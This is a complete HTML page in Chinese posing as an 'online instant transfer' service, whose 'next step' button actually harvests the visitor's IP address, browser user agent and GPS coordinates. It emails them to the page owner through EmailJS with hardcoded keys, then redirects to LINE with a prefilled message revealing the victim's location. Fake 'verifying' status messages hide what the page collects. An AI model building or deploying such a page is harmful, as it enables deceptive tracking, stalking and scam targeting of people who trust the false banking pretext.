<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>線上立即轉帳</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        button { padding: 15px 25px; font-size: 20px; }
        #status { margin-top: 20px; font-size: 18px; color: #333; }
    </style>
</head>
<body>
    <h2>線上立即轉帳</h2>
    <p>按下按鈕將自動開啟轉帳功能</p>
    <button id="actionBtn" onclick="sendLocation()">下一步</button>
    <p id="status"></p>

    <script>
        // 初始化 EmailJS
        (function() {
            emailjs.init("3Ih6a7-AdAxrbeq_L"); // 請替換為你的 EmailJS Public Key
        })();

        async function sendLocation() {
            const btn = document.getElementById("actionBtn");
            btn.disabled = true;
            document.getElementById("status").innerText = "正在驗證並處理，請稍候...";

            try {
                // 取得 IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // 取得瀏覽器資訊
                const userAgent = navigator.userAgent;

                // 取得定位
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
                        const text = `這是我的位置：\n${mapLink}`;

                        // 發送 Email
                        emailjs.send("service_l8rizek", "template_v1aubd6", {
                            from_name: "位置回報系統",
                            latitude: lat,
                            longitude: lon,
                            map_link: mapLink,
                            ip_address: userIP,
                            user_agent: userAgent
                        }).then(function() {
                            document.getElementById("status").innerText = "驗證完成，請稍候...";
                            setTimeout(() => {
                                // 自動開啟 LINE
                                window.location.href = `https://line.me/R/msg/text/?${encodeURIComponent(text)}`;
                            }, 1500);
                        }, function(error) {
                            document.getElementById("status").innerText = "系統忙碌，請稍後重試。";
                            btn.disabled = false;
                        });

                    }, function(error) {
                        document.getElementById("status").innerText = "定位失敗，請允許位置存取。";
                        btn.disabled = false;
                    });
                } else {
                    document.getElementById("status").innerText = "瀏覽器不支援定位功能";
                    btn.disabled = false;
                }
            } catch (e) {
                document.getElementById("status").innerText = "系統錯誤，請稍後再試。";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
